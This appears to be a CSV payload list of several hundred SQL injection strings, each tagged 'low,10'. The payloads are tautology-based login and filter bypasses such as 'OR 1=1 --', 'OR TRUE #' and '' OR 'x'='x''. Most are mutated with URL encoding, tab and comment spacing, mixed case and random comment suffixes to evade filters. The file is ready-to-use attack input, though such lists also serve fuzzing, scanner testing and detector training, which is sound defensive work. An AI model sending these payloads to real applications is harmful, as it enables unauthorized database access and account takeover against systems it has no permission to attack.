+OR%201=1%20--%20--%20ttrKcq%20--%20LuRAeOAq,low,10
+or	1=1	--	#	rtlctf # geiEXlclKg,low,10
+OR 1=1 -- /* test */ # MySQL comment,low,10
+OR+1=1+--+--+COMMENT,low,10
+||+1=1+--+--+comment -- comment -- BJYgVQMAU,low,10
+OR/**/1=1/**/--/**/--/**/comment -- comment,low,10
+OR 1=1 -- # MySQL comment -- ABHSRmY -- bdLWrHR # MySQL comment,low,10
+or 1=1 -- # HhXnJvmt,low,10
+OR	1=1	--	--	comment,low,10
+OR+1=1+--	--	mSfvULPke,low,10
+|| 1=1 -- # MySQL comment -- comment,low,10
+or 1=1 -- # MySQL comment /* test */,low,10
+OR+1=1+-- # tBptsrUk /* test */ -- comment,low,10
+OR 1=1 -- -- BzWkCUpQJ,low,10
+OR 1=1 # # aQmSKgwhZD,low,10
+or 1=1 # /* test */,low,10
+or 1=1 -- # zwVbj,low,10
+oR/**/1=1/**/--/**/--/**/commENT/**/--/**/DKHCJs,low,10
+OR  1=1  --  #  uiQPM,low,10
+|| 1=1 -- /* test */,low,10
+OR/**/1=1/**/--/**/--/**/comment # MySQL comment,low,10
+Or+1=1+#,low,10
+or	1=1	--,low,10
+OR+1=1+#+#+oGipXekQf,low,10
+OR 1=1 -- # vjAOIGkEr,low,10
+OR+1=1+--+--+comment+#+FpTgWLC,low,10
+Or%201=1%20--,low,10
+or 1=1 # # CFktmKwKd,low,10
+OR/**/1=1/**/--/**/--/**/EiXXS,low,10
+or/**/1=1/**/-- -- comment,low,10
+|| 1=1 -- # YCnHncsHf,low,10
+OR 1=1 -- # MySQL comment # KWyYt -- comment,low,10
+or/**/1=1/**/--/**/#/**/YBnBOEBlz,low,10
+OR%201=1%20--%20#%20mySql%20ComMent,low,10
+OR+1=1+--+--+yuXiTuIW,low,10
+or 1=1 -- # MySQL comment,low,10
+or 1=1 -- -- COMMENT -- jtxNJHckb,low,10
+OR 1=1 -- /* test */ -- YYnimKf,low,10
+Or 1=1 -- # mYsqL cOmMent -- coMMENt,low,10
+OR%201=1%20--%20#%20MySQL%20comment,low,10
+OR	1=1	--	--	COMMENT,low,10
+OR%201=1%20-- # KNFJiL,low,10
+||/**/1=1/**/--,low,10
+||%201=1%20--/**/--/**/iGBfGtfhda,low,10
+OR 1=1 -- # aFBoWIYyA,low,10
+or+1=1+--+/*+test+*/,low,10
+OR 1=1 -- -- comment /* test */ -- comment,low,10
+OR+1=1+--+#+BGQtRhqTiK,low,10
+OR	1=1	-- -- ueLOLBstC,low,10
+Or%201=1%20-- -- dWgCFo,low,10
+OR%201=1%20--%20--%20dgDDhrjDD%20--%20KGrsGmls,low,10
+or	1=1	-- # LxvOl,low,10
+or/**/1=1/**/-- -- wdXmSRvDZD -- comment,low,10
+OR 1=1 # -- dLiEaxFrlj,low,10
+||%201=1%20--%20--%20comment,low,10
+OR	1=1	--	#	SusIcxEiZt # MySQL comment,low,10
+OR 1=1 -- -- ikfOQX -- CuqUHUWJhY # gevtzzXmlf,low,10
+||+1=1+--+#+MySQL+comment+--+zOgkP,low,10
+or%201=1%20--%20#%20uwxhnjk,low,10
+or	1=1	--	/*	test	*/ /* test */,low,10
+||+1=1+# /* test */,low,10
+oR 1=1 -- -- comMent # mySqL CoMmENt -- BkHBPxFFuK,low,10
+OR+1=1+-- # MYSQL COMMENT,low,10
+OR 1=1 -- # hVCDtHOKL,low,10
+OR/**/1=1/**/-- /* test */ -- wrGfHcmKk,low,10
+OR	1=1	--	/*	test	*/,low,10
+or+1=1+-- # mirKZuZxm,low,10
+OR 1=1 -- # MySQL comment # NnxqSxM /* test */,low,10
+OR+1=1+-- # MySQL comment,low,10
+|| 1=1 -- # BRYnxa # VuyfAQ,low,10
+or 1=1 -- # MYSqL comMEnT,low,10
+OR 1=1 -- # HGSPBHY -- comment,low,10
+|| 1=1 -- -- hZjYAqkyq -- sjzleTHq,low,10
+OR+1=1+--%20/*%20test%20*/,low,10
+OR 1=1 -- # MySQL comment /* test */,low,10
+or	1=1	-- -- comment,low,10
+||	1=1	--	--	SVMzuVqMz,low,10
+OR 1=1 -- -- WRJKG,low,10
+OR	1=1	--+#+KHTNFDdFBn,low,10
+Or+1=1+--+#+mmFMmX,low,10
+||%201=1%20-- -- yNEcGHSVK,low,10
+OR 1=1 -- # tvDEno,low,10
+OR TRUE --,low,10
+|| TRUE -- /* test */,low,10
+OR	TRUE	--,low,10
+OR	TRUE	--	#	aRwQTHHj,low,10
+|| true --,low,10
+OR	TRUE	--	/*	test	*/,low,10
+|| TRUE --,low,10
+OR+TRUE+--,low,10
+OR/**/TRUE/**/--,low,10
+OR TRUE #,low,10
+OR TRUE -- -- wMAlCs,low,10
+OR		TRUE		-- # MySQL comment,low,10
+OR	TRUE	# -- wmmizLVtsY,low,10
+OR	TRUE	-- # MySQL comment,low,10
+||%20TRUE%20--,low,10
+or true --,low,10
+or true -- -- COMMENT,low,10
+or true -- # MySQL comment,low,10
+OR TRUE -- # RIBjuThkY,low,10
+OR%20TRUE%20--,low,10
+or+true+--+#+MySQL+comment,low,10
+OR TRUE -- /* test */,low,10
+OR TRUE -- -- gzkVCdmY,low,10
+OR TRUE -- # nOOXUF,low,10
+or tRuE --,low,10
+OR TRUE # /* test */,low,10
+OR TRUE -- # MySQL comment,low,10
+OR true --,low,10
+OR TRUE -- # sgAczcu,low,10
+OR TRUE -- -- comment,low,10
+OR TRUE # -- DufGrMfJ,low,10
+OR TRUE -- # DDsGre,low,10
+or	true	--,low,10
+OR TRUE -- -- comment -- comment,low,10
+OR	TRUE	--	--	grrmdYh,low,10
+OR+TRUE+--+/*+test+*/,low,10
+or/**/true/**/--,low,10
+OR TRUE -- # MySQL comment -- comment,low,10
+|| TRUE -- # MySQL comment,low,10
+OR TrUE --,low,10
+OR TRUE -- -- comment /* test */ # PbdLlEec,low,10
+|| TRUE -- -- comment,low,10
+OR+TRUE+-- -- sGkIq,low,10
+OR/**/TRUE/**/-- -- tsErFM,low,10
+OR%20TRUE%20-- /* test */ -- OiYZwDL,low,10
+OR TRUE -- -- dSsykSYalu,low,10
+or+true+--,low,10
+||%20TRUE%20-- # MySQL comment,low,10
+OR+TRUE+-- # WeZvmv,low,10
+OR	TRUE	--	/*	test	*/ -- comment,low,10
+or%20true%20#,low,10
+or true -- # mYsql COMMENT,low,10
+||	TRUE	--,low,10
+OR TRUE -- /* test */ # OPtUfbLPw,low,10
+OR	TRUE	--	--	comment,low,10
+OR/**/TRUE/**/--%20--%20PwVeJ,low,10
+or true -- /* test */,low,10
+oR TrUe --,low,10
+OR+tRUe+--,low,10
+OR%20TRUE%20--%20--%20bQQQeXvp,low,10
+OR TRUE -- -- iUXoLucLM,low,10
+Or%20TRuE%20--,low,10
+OR TruE --,low,10
+OR/**/TRUE/**/--/**/#/**/MySQL/**/comment,low,10
+or true -- -- iqyyfp /* test */,low,10
+||%20TRUE%20--%20#%20WokOaTRy,low,10
+OR/**/TRUE/**/#,low,10
+OR+TRUE+--+#+NRgrM # MySQL comment,low,10
+OR%20TRUE%20#,low,10
+OR%20TRUE%20-- -- comment,low,10
+OR TRUE -- -- COMMENT,low,10
+OR TRUE -- # CFlMfMfM,low,10
+OR TRUE -- -- yTPRnLqaJT,low,10
+OR TRUE # -- comment,low,10
+OR/**/tRue/**/--,low,10
+OR TRUE -- # jOsJzT -- WxsOujsn,low,10
+or true #,low,10
+OR+TRUE+-- # mOoel,low,10
+OR TRUE -- # cuDFu -- comment,low,10
+OR/**/TRUE/**/--/**//*/**/test/**/*/ # kaUcn,low,10
+OR TRUE # # MySQL comment,low,10
+OR  TRUE  --,low,10
+OR TRUE -- /* TEST */ # klDlaPpqVz,low,10
+oR TRuE -- # nZnuWtQ,low,10
+OR+TRUE+--+#+MySQL+comment,low,10
+or true -- -- comment,low,10
+OR true -- -- SLpkT,low,10
+Or truE --,low,10
+OR tRuE -- # cNGLnsDn,low,10
+|| TRUE #,low,10
+OR TRUE -- -- QLhNnkPn,low,10
+or	tRUE	--,low,10
+|| TRuE --,low,10
+OR	TRUE	--	#	PNWSECXWC,low,10
+OR/**/TRUE/**/-- -- comment,low,10
+OR	true	--,low,10
+or true -- # mysql comment,low,10
+OR True --,low,10
+OR TRUE -- # MySQL comment # cpuLqR # HcChAZsy,low,10
+OR/**/TRUE/**/--/**/--/**/PXpktQ,low,10
+Or	tRue	-- # MySQL comment,low,10
+Or%20TRUe%20#,low,10
+OR TRUE -- -- comment # MySQL comment,low,10
+OR/**/TRUE/**/-- /* test */,low,10
+OR tRuE -- -- ComMeNT # NqDqSN,low,10
+or	true	--	#	rekfdkex	#	mysql	comment,low,10
+OR TRUE -- -- Rphpnyxpm /* test */ -- comment,low,10
+OR%20TRUE%20#%20--%20nJGUnp,low,10
+OR%20TRUE%20-- # iMpUP,low,10
+OR+TRUE+-- -- AViZjnEJVy /* test */,low,10
+or/**/true/**/-- -- mOYhG # XBYqjaPmS,low,10
+OR/**/TRUE/**/--/**/#/**/uBKUJGMC,low,10
+OR  TRUE  --  #  MySQL  comment,low,10
+or  true  -- # FlWEdPtn,low,10
+OR TRUE -- -- ZDAGUA,low,10
+or true -- -- awcgw,low,10
+OR+TRUE+-- # MySQL comment /* test */,low,10
+OR/**/TRUE/**/--/**/#/**/LgGrHpHE/**/#/**/MySQL/**/comment/**/#/**/MySQL/**/comment,low,10
+OR TRUE -- -- comment # MySQL comment # Wgdhzf /* test */,low,10
+or%20true%20--,low,10
+||+TRUE+#,low,10
+or	true	-- -- comment,low,10
+OR%20TRUE%20-- # MySQL comment,low,10
+OR	TRUE	# -- comment,low,10
+OR+TRUE+#,low,10
+OR	TRUE	-- -- comment -- comment,low,10
+or%20true%20--%20--%20DeWHmMnMTd,low,10
+OR TRUE -- # JCVAzBd,low,10
+oR trUE --,low,10
+OR+TRUE+--+#+MYSQL+COMMENT,low,10
+or	true	-- /* test */,low,10
+OR TruE -- /* test */,low,10
+OR%20TRUE%20--%20#%20TEJtw,low,10
+OR TRUE -- # OTKVqi # fpqVhlL,low,10
+or%20true%20--%20#%20zxadk,low,10
+or%20true%20--%20#%20didirk,low,10
+||%20trUe%20--%20#%20MySQL%20CoMmENt,low,10
+oR TRuE # # IpLLU # DvLfWzsFO,low,10
+||	TRUE	--	#	juuiYcYK,low,10
+OR+TRUE+#+#+wgTmvvMw+#+MySQL+comment,low,10
+oR%20tRuE%20--+--+vKGoHk,low,10
+or TRUE #,low,10
+or	tRUe	--,low,10
+||/**/TRUE/**/--,low,10
+OR	TRUE	--	--	IhRrUE,low,10
+OR TRUE # # MySQL comment # TeLRfvJyRk,low,10
+||+true+# -- comment,low,10
+OR TRUE -- -- frnrHQOc # zbuLbrEyZv,low,10
+OR/**/TRUE/**/-- # WkUJi -- comment,low,10
+oR TruE --,low,10
+OR TRUE -- # OPIKRMB,low,10
+OR/**/TRUE/**/#/**//*/**/test/**/*/,low,10
+OR TrUe -- /* test */,low,10
+|| TrUe -- # MySQL comment # GrmhiuqMLu,low,10
+or	true	--	#	WeudVQCfV,low,10
+or true -- # VtWNW,low,10
+OR%20TRUE%20--%20--%20JByEpGaGD,low,10
+OR	TRUE	-- /* test */,low,10
+|| tRuE --,low,10
+OR TRUE -- -- fnEhpsv # MySQL comment -- comment,low,10
+OR TRUE -- # Sfrtrl,low,10
+OR TRUE -- -- comment /* test */,low,10
+|| TRUE # -- comment,low,10
+or	true	--	#	ykyvv,low,10
+||+TRUE+--,low,10
+Or/**/TRUe/**/-- # wmxhnw,low,10
+OR+TRuE+--,low,10
+oR+TRuE+-- /* tEST */,low,10
+OR	TRUE	-- /* test */ # MySQL comment,low,10
+||/**/TRUE/**/-- -- BSmdecRZO,low,10
+OR TRUE -- # MySQL comment # MySQL comment,low,10
+or+true+#+#+mysql+comment,low,10
+or tRue --,low,10
+or true -- # dhIOL,low,10
+OR+TRUE+# # bRcgln,low,10
+OR TRUE -- -- iJZpp # MySQL comment,low,10
+or true -- -- COMMENT /* test */,low,10
+OR TRUE -- # AemnVEuLDQ,low,10
+or TrUe --,low,10
+||/**/TRUE/**/--/**/--/**/comment/**/#/**/ZEJqko,low,10
+OR TRUE -- -- MHpUrFI,low,10
+or true # -- BPeNyEWJeZ # MySQL comment,low,10
+or/**/TruE/**/# # CiuTTGpESv,low,10
+|| TRUE -- -- UNPYUXQX,low,10
+OR+TRUE+-- /* test */,low,10
+oR/**//**/TruE/**//**/--,low,10
+OR+TRUE+# -- comment,low,10
+||	TRUE	--	#	MySQL	comment,low,10
+OR	TRUE	-- # xnpoobo,low,10
+Or/**/TRUE/**/--,low,10
+OR TrUe -- -- coMmeNT -- comment,low,10
+Or trUE --,low,10
+OR+TRUE+--%20#%20MySQL%20comment%20--%20NndER,low,10
+or%20%20true%20%20--,low,10
+OR%20TRUE%20--%20#%20MySQL%20comment%20#%20hUTtoSP,low,10
+||+TRUE+-- -- comment,low,10
+oR TruE # # MYSql cOmMenT,low,10
+|| TRUE -- # TYqKsQLH,low,10
+OR%20TRUE%20-- -- COMMENT # ukOuxyaxk,low,10
+OR/**/TRUE/**/--/**//*/**/test/**/*/,low,10
+OR TRUE -- # GKNEBRHJMV # MYSQL COMMENT /* test */,low,10
+OR%20TRUE%20--%20/*%20test%20*/,low,10
+Or truE -- # mysQL CoMmeNT,low,10
+or TRue --,low,10
+OR/**/TRUE/**/--/**/--/**/comment,low,10
+OR	TRUE	-- /* test */ -- nKGnrmF # MySQL comment,low,10
+OR TRUE -- -- lPVdI,low,10
+OR/**/TRUE/**/-- # MySQL comment # HqqollDoG,low,10
+OR TRUE -- # NjwqVlVL,low,10
+OR	TRUE	#,low,10
+or  true  --,low,10
+OR+TRUE+-- # MySQL comment -- rmsUKm,low,10
+OR TRUE -- # ZWKlKKh,low,10
+OR+TRUE+-- -- comment,low,10
+oR%20TRue%20--,low,10
+or+true+#,low,10
+OR TRUE -- # MySQL comment # cfyqxp -- TQyRTnT,low,10
+|| TRUE -- # OUMTFHYHGV -- comment,low,10
+OR TRUE # /* test */ # MySQL comment,low,10
+OR/**/TRUE/**/--/**/#/**/FzHYhFNY,low,10
+OR%20tRUE%20--,low,10
+||%20TRUE%20-- # XHMDOaN,low,10
+OR/**/TRUE/**/--/**/--/**/VKvdInehjQ,low,10
+||%20true%20--,low,10
+OR/**/TRUE/**/-- # MySQL comment,low,10
+OR%20TRUE%20--	--	PuGbb,low,10
+or	true	--	#	WvrGOwMng /* test */,low,10
+OR%20tRUe%20--,low,10
+OR	TRUE	#%20#%20FyWnDRs # MySQL comment,low,10
+OR/**/TRUE/**/#/**/#/**/CJunt,low,10
+OR%20TRUE%20--%20/*%20test%20*/ # cKhzYdbZV /* test */,low,10
+or true -- -- OncQzE,low,10
+OR/**/TRUE/**/--/**//*/**/test/**/*/ /* test */,low,10
+Or tRuE -- -- comment,low,10
+Or TruE --,low,10
+or%20true%20--%20--%20comment,low,10
+OR+TRUE+--+--+comment /* test */,low,10
+OR TRUE -- -- KIZBMDB -- comment,low,10
+|| TRUe #,low,10
+OR+TRUE+-- # MYSQL COMMENT # NXVfj,low,10
+OR TRUE # # ZuuaAuUd # MySQL comment,low,10
+or true -- /* TEST */,low,10
+OR/**/TRUE/**/-- -- gHNzgz,low,10
+oR TruE # # HwWzAxqcu,low,10
+OR/**/TRUE/**/--/**//*/**/test/**/*//**/#/**/hjmGYecRj,low,10
+or	TrUE	# # sirpNf,low,10
+oR%20tRUe%20--/**/--/**/MMNLFeh,low,10
+oR+TRue+--+/*+test+*/+#+ZqaJCfDXU,low,10
+OR	TRUE	--	#	GYjopODuA -- comment,low,10
+or true # # comment,low,10
+1=1 --,low,10
+1=1 #,low,10
+1=1 -- -- comment,low,10
+1=1+--,low,10
+1=1/**/#,low,10
+1=1	--,low,10
+1=1 -- # MySQL comment,low,10
+1=1/**/--/**/--/**/orZzM,low,10
+1=1 -- -- comment # ndBXbJHX,low,10
+1=1/**/--,low,10
+1=1%20--,low,10
+1=1 -- /* test */,low,10
+1=1 -- /* test */ # eStbGdIZyG,low,10
+1=1 -- /* TEST */,low,10
+1=1 -- -- comment # yhiruIH,low,10
+1=1 -- # huVAHvKEAQ,low,10
+1=1	--	/*	test	*/,low,10
+1=1 -- # JRLEQ -- comment,low,10
+1=1/**/--/**//*/**/test/**/*/,low,10
+1=1+-- # JLKOapCbDy,low,10
+1=1 -- -- MaKMNB,low,10
+1=1 -- # qLtwWjRsZ,low,10
+1=1 -- # ujwdu,low,10
+1=1 -- # qOTzW,low,10
+1=1 -- # MySQL comment # MySQL comment # MySQL comment,low,10
+1=1 -- -- sllHLigf,low,10
+1=1 # -- comment,low,10
+1=1 -- -- RiKGwBG,low,10
+1=1 -- -- ADltAayP,low,10
+1=1 -- /* test */ -- OZhvJULH,low,10
+1=1/**/-- # MySQL comment,low,10
+1=1 -- -- mvdRCPC,low,10
+1=1 -- -- vcxXyQfYf,low,10
+1=1  --,low,10
+1=1 -- # MySQL comment -- rUhiXJArSI,low,10
+1=1  --  #  MySQL  comment # MySQL comment,low,10
+1=1 -- -- xjUtXAyCL,low,10
+1=1 # # comment,low,10
+1=1 -- /* test */ -- UZUbj,low,10
+1=1 -- -- qSCHASZx,low,10
+1=1 -- # ynOyT /* test */ -- comment,low,10
+1=1  -- -- comment,low,10
+1=1 -- -- adRimyO,low,10
+1=1 # # GmViVkpg,low,10
+1=1	#	#	MySQL	comment,low,10
+1=1/**/--/**/#/**/MySQL/**/comment,low,10
+1=1 -- # xTiFJnRjc,low,10
+1=1 -- -- cZxOXEr,low,10
+1=1  --  --  EdTerquGdh,low,10
+1=1 -- # rfCUZ,low,10
+1=1 -- # AYXeKkRC,low,10
+1=1	-- -- comment,low,10
+1=1 -- -- comment # rdkzr,low,10
+1=1 -- -- rFSUwEepCB,low,10
+1=1 -- # EdACSQcY,low,10
+1=1 -- -- bnVipyC,low,10
+1=1+-- # nPYAut,low,10
+1=1 -- -- SZsUuaLqj,low,10
+1=1+#,low,10
+1=1/**/--/**/#/**/MySQL/**/comment/**/#/**/MySQL/**/comment,low,10
+1=1 # # MySQL comment,low,10
+1=1/**/-- /* test */,low,10
+1=1%20#,low,10
+1=1/**/--/**/--/**/comment/**/#/**/MySQL/**/comment,low,10
+1=1+--+#+MySQL+comment,low,10
+1=1%20-- -- comment,low,10
+1=1 -- # qUYMYEJxY # OqlfHBxKmv,low,10
+1=1 -- -- VAtbxDIdYm,low,10
+1=1 -- # fSFlBkK,low,10
+1=1 -- -- OOgEI,low,10
+1=1 -- -- XRMOFNXPO /* test */,low,10
+1=1	--	/*	test	*/	/*	test	*/,low,10
+1=1	-- -- sBhgPCr,low,10
+1=1 -- -- comment # gjWhVJc,low,10
+1=1/**/-- # BafIfpyST,low,10
+1=1 -- # NGEMdkNDW -- cFZBeG,low,10
+1=1	--	#	mDXwATaQX -- comment,low,10
+1=1+--+#+FcNoF+--+comment,low,10
+1=1%20-- -- qvsyRWqqc,low,10
+1=1+# # ViwnxExpD,low,10
+1=1 -- -- lnNwccHhO,low,10
+1=1/**/--/**/--/**/comment,low,10
+1=1	--	--	comment -- comment,low,10
+1=1/**/--/**/--/**/jbwmjcbj # MySQL comment,low,10
+1=1 -- -- QcuMbJ # sKHoYDtMmR,low,10
+1=1 -- -- COMMEnt -- lyLdDEuwW # MySQL comment,low,10
+1=1 -- # MySQL comment /* test */,low,10
+1=1/**/--/**/#/**/iGPSzdq,low,10
+1=1/**/--/**//*/**/TEST/**/*/,low,10
+1=1+--+#+mYsql+COMMENT,low,10
+1=1/**/-- # RDLFMch,low,10
+1=1%20--+--+CIGYNERQ,low,10
+1=1 -- # MySQL comment -- taRXpFAQI,low,10
+1=1	-- # ktwcs,low,10
+1=1	--	#	xEkTQZCmc -- voUdYCDB,low,10
+1=1 -- -- LTKyx,low,10
+1=1%20# # APsFI,low,10
+1=1%20-- /* TEST */ # MYSQL COMMENT,low,10
+1=1 # -- comment # MySQL comment,low,10
+1=1 -- -- HlSoNUjmzy -- fYpTQRis -- comment,low,10
+1=1 -- # MySQL comment -- comment,low,10
+1=1 -- /* test */ /* test */,low,10
+1=1+#+/*+test+*/,low,10
+1=1/**/-- # EWqVex -- lKwnKkbczj,low,10
+1=1/**/# # MySQL comment,low,10
+1=1 -- -- RuMhRKMWF,low,10
+1=1 -- /* test */ # MySQL comment,low,10
+1=1 -- -- COMMENT,low,10
+1=1%20--%20/*%20test%20*/,low,10
+1=1/**//**/--,low,10
+1=1 -- -- Bnparlhp # MySQL comment,low,10
+1=1	--	#	MySQL	comment,low,10
+1=1+-- # fgUgLYtW # pJnOLLK,low,10
+1=1/**/--/**/#/**/LZNtbdD/**/--/**/comment,low,10
+1=1+--+/*+TEST+*/+#+MYSQL+COMMENT,low,10
+1=1 -- -- WnCVpZy -- FyWrFji # MySQL comment,low,10
+1=1 -- # MySQL comment -- oxDLgw -- comment,low,10
+1=1 -- # DTazflzysV # GWTRx,low,10
+1=1%20--%20/*%20TEST%20*/,low,10
+1=1	#,low,10
+1=1+--+--+smtgmdoy,low,10
+1=1 # -- COMMENT,low,10
+1=1	-- /* test */,low,10
+1=1 -- /* test */ # UYXxLSc,low,10
+1=1 -- -- lLuKDGOp # MySQL comment,low,10
+1=1+-- -- comment /* test */,low,10
+1=1 -- -- xrSPoX # uFNcvwr,low,10
+1=1%20-- # MySQL comment,low,10
+1=1 -- -- hEEFTFjHQk,low,10
+1=1 -- -- comment -- kvnugx # mysql comment,low,10
+1=1 -- -- immAngpYmx # NXpJaj,low,10
+1=1+--+--+comment # MySQL comment,low,10
+1=1 -- -- comment -- oIRZc,low,10
+1=1 # # comment -- MUrPbyrbDL /* test */,low,10
+1=1 -- -- oGchSIj -- comment,low,10
+1=1 -- # mYsql COMMENT,low,10
+1=1 -- # hBtra /* test */ # HXIAnyxthz /* test */,low,10
+1=1	--	#	rtQIUseyv/**/--/**/xvLqHeJKvs,low,10
+1=1/**/#/**/--/**/comment,low,10
+1=1+-- -- pZSFuyTrzG # MySQL comment,low,10
+1=1+# # mCciE /* test */ # MySQL comment,low,10
+1=1	-- -- oizvqn,low,10
+1=1 -- -- ygahxw /* test */,low,10
+1=1	-- /* test */ -- comment,low,10
+1=1 -- /* test */ # SIWDkC /* test */,low,10
+1=1 -- # YEiAWz,low,10
+1=1+-- -- comment,low,10
+1=1 -- # mMnDKO,low,10
+1=1%20--%20#%20mysql%20comment -- comment,low,10
+1=1/**/#%20--%20comment,low,10
+1=1 -- # WnTAWHsSsW,low,10
+1=1 -- -- PHIDAVXR -- comment,low,10
+1=1 -- # OsQAxZ -- DderhEOka,low,10
+1=1	--	/*	TEsT	*/,low,10
+1=1	#	/*	test	*/,low,10
+1=1 -- /* TESt */,low,10
+1=1 -- # qGdpDwp -- CoMMENt,low,10
+1=1 -- # qXPjCGK,low,10
+1=1%20--/**/#/**/ftVQcAZVg/**/--/**/comment,low,10
+1=1+--+#+ZdUbZZjQf,low,10
+1=1 -- # MYSQL COMMENT -- COMMENT,low,10
+1=1+# /* test */ # ZSpvkjkkdH,low,10
+1=1 # -- kdVPBoJdHR,low,10
+1=1 -- -- WWkrYV,low,10
+1=1  #  #  MySQL  comment,low,10
+1=1+--/**/--/**/comment,low,10
+1=1 -- # XxoVqYoixm # ZZMSA,low,10
+1=1+--+#+SZAEfdCz,low,10
+1=1 -- -- XkaxR # MySQL comment,low,10
+1=1/**/# -- DZcjeRj,low,10
+1=1 -- -- YfRqYLTnu # MySQL comment,low,10
+1=1 -- # vkpzgwlapu -- hknweraoda,low,10
+1=1 -- # vNHjM # nLJLGcq,low,10
+1=1 -- -- CTofcgrwwo -- comment,low,10
+1=1	-- # MySQL comment,low,10
+1=1%20-- -- tFTIy,low,10
+1=1%20-- -- TIIwxPCY -- ZXxDoe,low,10
+1=1 -- -- comment # lxqwnJ,low,10
+1=1+--+/*+test+*/,low,10
+1=1 -- # MySqL cOmMent,low,10
+1=1+-- /* test */,low,10
+1=1/**/-- -- COMMENT,low,10
+1=1 -- -- CMvqIMexEP -- UBAED,low,10
+1=1 -- # MySQL comment # MySQL comment,low,10
+1=1	--	#	TBDBZ /* TEST */,low,10
+1=1/**/-- -- comment,low,10
+1=1	--	#	hYzJsyhGy	--	comment,low,10
+1=1	--	--	comment	#	MySQL	comment,low,10
+1=1 -- # OPmWtRW,low,10
+1=1/**/--%20--%20ZHWNPGZWNC,low,10
+1=1%20#%20/*%20test%20*/,low,10
+1=1 # # JNMur,low,10
+1=1+--+--+jshleksfs+/*+test+*/,low,10
+1=1 -- -- comment # MySQL comment,low,10
+1=1/**/--/**/--/**/comment	#	GbdRV,low,10
+1=1 -- -- comment # MySQL comment # MySQL comment,low,10
+1=1%20# # MySQL comment -- arwqKuHKOa,low,10
+1=1 -- -- iNZLEZ,low,10
+1=1%20--%20--%20UQFTEOAL,low,10
+1=1%20-- /* test */,low,10
+1=1+#+#+comment+#+TWIzvfpN,low,10
+1=1%20--%20#%20MySQL%20comment%20/*%20test%20*/,low,10
+1=1 # /* test */,low,10
+1=1	--	/*	TEST	*/,low,10
+1=1%20--%20#%20nuCgUKibW -- rDsNqarKDf,low,10
+1=1 -- -- commENT -- ahMytUtYVa,low,10
+1=1	--	#	oyisgqrm,low,10
+1=1%20--%20#%20dhfDBtzz,low,10
+1=1 -- # QmDXhvFSs # oqexKEgq,low,10
+1=1+--+--+WGNJQ,low,10
+1=1/**/-- -- xEmhfTg,low,10
+1=1/**/--%20--%20qiXHtqjY,low,10
+1=1/**/-- -- sYcQItWQX # MySQL comment -- comment,low,10
+1=1 -- # MfXSqVO # PrGyflmBu -- YuJTgYIdc,low,10
+1=1	--	#	MySQL	comment -- comment,low,10
+1=1/**/--/**/--/**/RKBQXAY,low,10
+1=1	--	--	comment,low,10
+1=1%20-- # mYsql COMMENT -- comment,low,10
+1=1	--	#	VBEnQgGlK,low,10
+1=1+-- # PgFDAWDaNB -- ZEcIV,low,10
+1=1%20--%20--%20comment,low,10
+1=1+--+--+MguUf,low,10
+1=1/**/-- -- CMoJK # MxOjJ -- FOWLxGQh,low,10
+1=1 -- -- pzZRoOMVA,low,10
+1=1 -- # MySQL comment # MySQL comment -- comment -- kVewGlqSZa,low,10
+1=1/**/--/**/#/**/zryihqxkn,low,10
+1=1+--+#+mysql+comment,low,10
+1=1 -- # vzkioUI,low,10
+1=1%20--%20--%20nFhWvE,low,10
+1=1%20#%20#%20IsdrPOPsRT,low,10
+1=1+--+--+comment+--+XxwZBfo -- comment,low,10
+1=1/**/--/**/#/**/MYSql/**/COMMENt,low,10
+1=1 -- # pwxyoe -- comment,low,10
+1=1 # # DWINSsE # DXMNv,low,10
+1=1+--+--+comment,low,10
+1=1 -- -- cOmMeNt,low,10
+1=1	--/**/--/**/viHag,low,10
+1=1 -- -- inqamh,low,10
+1=1/**/-- -- SnARFsez,low,10
+1=1	-- # MySQL comment # lDalWK,low,10
+1=1+-- # MySQL comment # gEGOUGVfXy,low,10
+1=1 -- /* test */ # oitSy /* test */,low,10
+1=1%20-- -- comment -- RmtTK,low,10
+1=1/**/--/**/#/**/MySQL/**/comment/**/#/**/uDiFodWki -- Gldayfmc,low,10
+1=1%20--	--	comment # OMsjtOyHIx,low,10
+1=1%20# /* test */,low,10
+1=1+--+#+yRrsS,low,10
+1=1%20-- # WuKrWCQ /* test */,low,10
+1=1 # /* TEST */,low,10
+1=1 -- -- comment /* test */,low,10
+' OR 'x'='x',low,10
+'%20OR%20'x'='x',low,10
+"""%20OR%20""x""=""x""",low,10
+' or 'X'='X',low,10
+'%20OR%20'x'='x'%20--%20comment%20/*%20test%20*/,low,10
+' or 'x'='x',low,10
+' OR 'x'='x' # MySQL comment /* test */ -- comment,low,10
+' OR 'x'='x' -- hFumfS,low,10
+'%20OR%20'X'='X',low,10
+' OR 'x'='x' # qCvIJTvMWi,low,10
+' OR 'x'='x' # MySQL comment,low,10
+'+OR+'x'='x'+/*+test+*/,low,10
+' OR 'X'='X' /* TEST */,low,10
+'+OR+'x'='x',low,10
+' or 'X'='X' # DdFxTU,low,10
+' OR 'x'='x' -- zuoNXdkqW,low,10
+' OR 'x'='x' # MySQL comment /* test */,low,10
+' OR 'X'='X' # LbIbQrSRu,low,10
+' || 'x'='x',low,10
+' or 'x'='x' /* test */,low,10
+'/**/OR/**/'x'='x',low,10
+' OR 'x'='x' -- HHycMZw,low,10
+'+or+'x'='x',low,10
+' OR 'X'='X',low,10
+' OR 'x'='x' -- sXtZS,low,10
+' OR 'x'='x' /* test */,low,10
+'	OR	'x'='x' -- comment,low,10
+' OR 'x'='x' /* test */ # comment,low,10
+""" OR ""x""=""x"" -- eJQZDaYCR # SbasrBeyTw",low,10
+'	or	'x'='x',low,10
+""" OR ""x""=""x""",low,10
+""" OR ""x""=""x"" -- VGrdMVwd",low,10
+' OR 'x'='x' -- comment # MySQL comment,low,10
+'+or+'X'='X',low,10
+'/**/OR/**/'x'='x'/**//*/**/test/**/*/,low,10
+' OR 'X'='X' -- NMJPYOBL,low,10
+' or 'X'='x',low,10
+'/**/OR/**/'X'='X',low,10
+'/**/||/**/'X'='x',low,10
+' OR 'X'='x',low,10
+'	OR	'x'='x',low,10
+""" or ""x""=""x""",low,10
+' || 'x'='x' -- ZNSgFz,low,10
+'+OR+'x'='x' # MySQL comment,low,10
+""" OR ""X""=""X""",low,10
+' OR 'X'='X' # UFDEMQMYA,low,10
+"""  Or  ""x""=""X""",low,10
+""" OR ""x""=""x"" # iDiJPALABP",low,10
+'/**/OR/**/'x'='x'/**/#/**/HsXZlohCOB,low,10
+'/**/||/**/'x'='x',low,10
+' OR 'x'='x' # dmCZbZMFk,low,10
+' or 'X'='X' # mYsql COMMENT,low,10
+'  OR  'x'='x',low,10
